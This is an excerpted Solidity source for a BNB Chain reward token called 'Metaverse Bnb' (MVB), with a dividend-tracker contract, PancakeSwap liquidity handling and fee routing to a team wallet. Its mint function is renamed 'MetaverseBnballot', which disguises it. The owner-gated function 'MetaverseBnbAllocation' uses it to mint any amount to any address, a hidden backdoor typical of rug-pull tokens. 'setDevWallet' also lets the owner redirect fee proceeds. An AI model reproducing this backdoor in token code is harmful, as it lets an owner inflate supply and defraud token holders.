...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function MetaverseBnballot(address account, uint256 amount) internal virtual {
...
function MetaverseBnballot(address account, uint256 value) internal override {
    super.MetaverseBnballot(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      MetaverseBnballot(account, mintAmount);
...
contract MetaverseBnbrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMetaverseBnbMap  for RewardMetaverseBnbMap .Map;
RewardMetaverseBnbMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MetaverseBnb_rewardToken_Tracker", "MetaverseBnb_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MetaverseBnb_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MetaverseBnb_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MetaverseBnb contract.");
    }
...
contract MetaverseBnb is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  returnHolderFee = 7;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    MetaverseBnbrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public teamFeeReciever =0x37976dAEf1C7e46Cd2b46B7128cDfa7191fe9215;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Metaverse Bnb", "MVB") {
 
        TotalFees = returnHolderFee.add(liquidityFee).add(teamFee);
      PanCakeRouter02 _DEXV2Router = PanCakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MetaverseBnbrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 MetaverseBnballot(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function MetaverseBnbAllocation(address userAddress, uint256 tokenToUser) public masterWallet{
       MetaverseBnballot(userAddress, tokenToUser);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        teamFeeReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MetaverseBnb: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MetaverseBnb: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MetaverseBnb: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MetaverseBnb: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMetaverseBnb = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMetaverseBnb);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(returnHolderFee).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTMetaverseBnb, bnbForLiquidity);
payable(teamFeeReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(returnHolderFee).div(TotalFees), bnbForReflection);
        }
    }
